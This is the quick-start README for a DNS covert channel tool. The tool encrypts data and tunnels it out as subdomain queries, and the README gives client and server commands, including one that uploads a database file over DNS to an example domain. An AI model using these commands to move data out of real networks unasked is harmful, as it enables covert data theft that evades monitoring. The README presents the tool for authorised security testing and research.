# Mumbojumbo Quick Start Guide

## What is Mumbojumbo?

Mumbojumbo is a DNS covert channel that sends encrypted key-value data via DNS queries. It uses ChaCha20-Poly1305 symmetric encryption with dual-layer authentication, fragments messages into 28-byte chunks, and encodes each fragment as a Base36 DNS subdomain query.

## Quick Test (Recommended: Environment Variables)

### Terminal 1 - Server
```bash
# 1. Generate keys and export to environment (do this once)
python3 mumbojumbo.py --gen-keys > ~/.mumbojumbo_env
source ~/.mumbojumbo_env

# 2. Start server (requires sudo for packet capture, -E preserves env vars)
sudo -E python3 mumbojumbo.py
```

### Terminal 2 - Client
```bash
# Load the same environment variables
source ~/.mumbojumbo_env

# Send data using Python client (no arguments needed, no dependencies!)
echo "Hello World" | python3 clients/python/mumbojumbo_client.py
```

**Note:** No dependencies required - uses Python 3.8+ standard library only!

## Alternative: Using Config File

### Terminal 1 - Server
```bash
# Generate config (do this once)
python3 mumbojumbo.py --gen-conf > mumbojumbo.conf
chmod 600 mumbojumbo.conf

# Start server (requires sudo for packet capture)
sudo python3 mumbojumbo.py --config mumbojumbo.conf
```

### Terminal 2 - Client
```bash
# Extract client key from config file comments
# Look for: mumbojumbo_client_key = mj_cli_<64_hex_chars>
# Use that key with any client
echo "Hello" | python3 clients/python/mumbojumbo_client.py \
  --client-key mj_cli_<your_key_here> \
  -d .asd.qwe
```

## Python Client

The Python client (`clients/python/mumbojumbo_client.py`) is the reference implementation.

**Features:**
- **No dependencies:** Uses Python 3.8+ standard library only
- **Key-value protocol:** Send structured data with keys for server-side routing
- **Upload mode:** Transfer files with special `u://` protocol
- **Auto-configuration:** Uses environment variables when available
- **Flexible input:** Read from stdin, files, or command-line arguments

**Basic usage:**
```bash
# Simple message (piped from stdin, no key)
echo "Hello World" | python3 clients/python/mumbojumbo_client.py

# Named key-value pair for routing
python3 clients/python/mumbojumbo_client.py \
  --client-key mj_cli_<hex> \
  -d .example.com \
  -k "logs:error" \
  -v "Database connection failed"

# Upload file (key automatically set to u://<filename>)
python3 clients/python/mumbojumbo_client.py \
  --client-key mj_cli_<hex> \
  -d .example.com \
  -u /path/to/local/db.sql
```

See [clients/python/README.md](clients/python/README.md) for complete documentation.

## Exact Commands to Run

### Setup (one time)
```bash
# Generate keys and save to environment file
python3 mumbojumbo.py --gen-keys > ~/.mumbojumbo_env

# Load environment variables
source ~/.mumbojumbo_env

# Alternatively, generate a config file
python3 mumbojumbo.py --gen-conf > mumbojumbo.conf
chmod 600 mumbojumbo.conf
```

**Note:** No dependencies or virtual environment needed - uses Python 3.8+ standard library only!

### Running the Server

**Option A - With environment variables (recommended):**
```bash
# Load environment
source ~/.mumbojumbo_env

# Start server (sudo -E preserves environment variables)
sudo -E python3 mumbojumbo.py
```

**Option B - With config file:**
```bash
# Start server with config
sudo python3 mumbojumbo.py --config mumbojumbo.conf
```

**Option C - With CLI overrides:**
```bash
# Override specific settings
sudo python3 mumbojumbo.py \
  -k mj_cli_<64_hex_chars> \
  -d .example.com
```

**Why sudo?** The server uses `tshark` to capture network packets, which requires root privileges.

### Sending Data

**Option A - Python client with env vars (recommended):**
```bash
source ~/.mumbojumbo_env
echo "Hello World" | python3 clients/python/mumbojumbo_client.py
# No arguments needed - uses environment variables automatically
# No dependencies - uses Python 3.8+ standard library only
```

**Option B - Python client with explicit arguments:**
```bash
echo "Hello" | python3 clients/python/mumbojumbo_client.py \
  --client-key mj_cli_<64_hex_chars> \
  -d .example.com
```

**Option C - Go client:**
```bash
# Build first (requires Go toolchain)
cd clients/go
go build -o mumbojumbo-client mumbojumbo-client.go

# Use client
echo "Hello" | ./mumbojumbo-client \
  --client-key mj_cli_<64_hex_chars> \
  -d .example.com
```

**Option D - Node.js client:**
```bash
cd clients/nodejs
npm install  # Install dependencies first
echo "Hello" | ./mumbojumbo-client.js \
  --client-key mj_cli_<64_hex_chars> \
  -d .example.com
```

## Key Format

Mumbojumbo uses a single 32-byte master key (symmetric encryption):

- **Client key:** `mj_cli_<64_hex_chars>` - Master symmetric key shared by server and all clients

**IMPORTANT:** This is **not** public key cryptography. All parties (server and clients) use the same key.

Example:
```bash
# Master symmetric key (used by server AND clients, keep secret!)
mj_cli_6eaa1b50a62694a695c605b7491eb5cf87f1b210284b52cc5c99b3f3e2176048
```

**Key Derivation:**
The master key derives three 32-byte keys using Poly1305-based KDF:
- `enc_key` - ChaCha20 encryption
- `auth_key` - Message integrity MAC
- `frag_key` - Fragment authentication MAC

## Configuration Precedence

The server checks configuration in this order:
1. **CLI arguments** (`-k`, `-d`) - highest priority
2. **Environment variables** (`MUMBOJUMBO_CLIENT_KEY`, `MUMBOJUMBO_DOMAIN`)
3. **Config file** (`--config mumbojumbo.conf`) - lowest priority

This allows flexible deployment scenarios.

## Handler Pipeline (Optional)

Mumbojumbo supports multiple output handlers for received packets:

### Available Handlers

1. **stdout** - Print packet data to console as JSON (default)
2. **smtp** - Forward packets via email
3. **upload** - Save uploaded files to disk (for `u://` keys)
4. **packetlog** - Log all packet metadata and data
5. **file** - Write packet data to files
6. **execute** - Run external command with packet data as input
7. **filtered** - Route packets to specific handlers based on key glob patterns

### Configuration

Edit `mumbojumbo.conf` to configure handlers:

```ini
[main]
# Comma-separated list of handlers (executed in order)
handlers = stdout,smtp,file

[smtp]
server = smtp.gmail.com
port = 587
start-tls
username = your-email@gmail.com
password = your-smtp-password
from = your-email@gmail.com
to = recipient@example.com

[file]
path = /var/log/mumbojumbo-packets.log
format = hex  # Options: raw, hex, base64

[execute]
command = /usr/local/bin/process-packet.sh
timeout = 5
```

### Testing Handlers

```bash
# Test all configured handlers
./venv/bin/python3 mumbojumbo.py --config mumbojumbo.conf --test-handlers

# This sends test data through each handler to verify configuration
```

## Configuration File Format

```ini
#
# !! remember to `chmod 0600` this file !!
#
# for use on client-side:
#   domain = .asd.qwe
#   mumbojumbo_client_key = mj_cli_063063395197359dda591317d66d3cb7876cb098ad6908c22116cb02257fb679
#

[main]
domain = .asd.qwe
network-interface = en0  # macOS: en0, en1; Linux: eth0, wlan0
handlers = stdout  # Comma-separated: stdout, smtp, upload, packetlog, file, execute, filtered
client-key = mj_cli_063063395197359dda591317d66d3cb7876cb098ad6908c22116cb02257fb679

# Optional handler configurations
[smtp]
server = smtp.gmail.com
port = 587
start-tls
username = user@gmail.com
password = your-smtp-password
from = user@gmail.com
to = recipient@example.com

[file]
path = /var/log/mumbojumbo-packets.log
format = hex  # Options: raw, hex, base64

[execute]
command = /usr/local/bin/process-packet.sh
timeout = 5
```

## How It Works

1. **Client Side:**
   - Builds key-value plaintext (1B key length + key + value)
   - Inner encryption: ChaCha20 with 8-byte random nonce + 8-byte integrity MAC
   - Fragments into 28-byte chunks
   - Per-fragment encryption: ChaCha20 with nonce = packet_id + flags
   - Adds 4-byte fragment MAC (verified before decryption)
   - Wire format: 40 bytes total (4B packet_id + 4B flags + 4B MAC + 28B encrypted payload)
   - Encodes as Base36 (63 characters)
   - Creates DNS query: `<63-char-base36-fragment>.asd.qwe`

2. **Server Side:**
   - Captures DNS queries with `tshark`
   - Filters for configured domain
   - Decodes Base36 → 40 bytes
   - Verifies 4-byte fragment MAC BEFORE decryption
   - Decrypts 28-byte payload using nonce = packet_id + flags
   - Reassembles fragments by packet_id
   - Verifies 8-byte message integrity MAC
   - Decrypts message to get key-value pair
   - Routes to handlers based on key (glob pattern matching)
   - Handlers process data (stdout, SMTP, file upload, etc.)

## Troubleshooting

**"tshark: command not found"**
```bash
# macOS
brew install wireshark

# Ubuntu/Debian
sudo apt-get install tshark

# Allow non-root capture (Linux)
sudo dpkg-reconfigure wireshark-common
sudo usermod -a -G wireshark $USER
```

**"Permission denied" when capturing**
- Server needs sudo/root for packet capture
- Or use test mode (--test-server) which doesn't capture

**"Module not found: nacl"**
```bash
./venv/bin/pip install pynacl
```

**Network interface not found**
```bash
# List interfaces
ip link show    # Linux
ifconfig       # macOS

# Update mumbojumbo.conf with correct interface
```

## Performance

Run performance test:
```bash
./venv/bin/python3 test.py --test-performance
```

Example output:
- Processes 1024 messages (1024 bytes each)
- Shows send/receive times
- Displays total fragment count

## Security Warnings ⚠️

This is a **demonstration implementation** with known vulnerabilities:

- No timestamp protection (replay attack vulnerable)
- No perfect forward secrecy
- No rate limiting
- Designed for educational/testing purposes only

**Never use for:**
- Production systems
- Sensitive data in untrusted environments
- Bypassing security controls without authorization

**Use only for:**
- Educational purposes
- Authorized security testing
- CTF challenges
- Research with permission

## Running All Tests

```bash
# Run complete test suite
./venv/bin/python3 test.py

# Should output:
# ....
# ----------------------------------------------------------------------
# Ran 4 tests in X.XXXs
# OK
```

## Additional Tools

```bash
# Generate single key pair
./venv/bin/python3 mumbojumbo.py --gen-keys

# Generate full config skeleton
./venv/bin/python3 mumbojumbo.py --gen-conf

# Test SMTP settings
./venv/bin/python3 mumbojumbo.py --config mumbojumbo.conf --test-smtp

# Show setup guide
python3 setup_and_run.py
```

## Files Created

- `client.html` - Web-based client interface
- `setup_and_run.py` - Detailed setup instructions
- `QUICKSTART.md` - This file
- `mumbojumbo.conf` - Generated configuration (you create this)
- `mumbojumbo.py` - Server (converted to Python 3)
- `test.py` - Test suite (converted to Python 3)

## Summary of Exact Commands

### Environment Variable Workflow (Recommended)

```bash
# 1. Setup (one time)
python3 -m venv venv
./venv/bin/pip install pynacl
./venv/bin/python3 mumbojumbo.py --gen-keys > ~/.mumbojumbo_env
source ~/.mumbojumbo_env

# 2. Run server
sudo -E ./venv/bin/python3 mumbojumbo.py

# 3. Run client (different terminal)
source ~/.mumbojumbo_env
echo "Hello" | ./clients/python/mumbojumbo-client.py
```

### Config File Workflow

```bash
# 1. Setup (one time)
python3 -m venv venv
./venv/bin/pip install pynacl
./venv/bin/python3 mumbojumbo.py --gen-conf > mumbojumbo.conf
chmod 600 mumbojumbo.conf

# 2. Run server
sudo ./venv/bin/python3 mumbojumbo.py --config mumbojumbo.conf

# 3. Run client (use key from config comments)
echo "Hello" | ./clients/python/mumbojumbo-client.py \
  -k mj_cli_<key_from_config> \
  -d .asd.qwe
```

That's it!
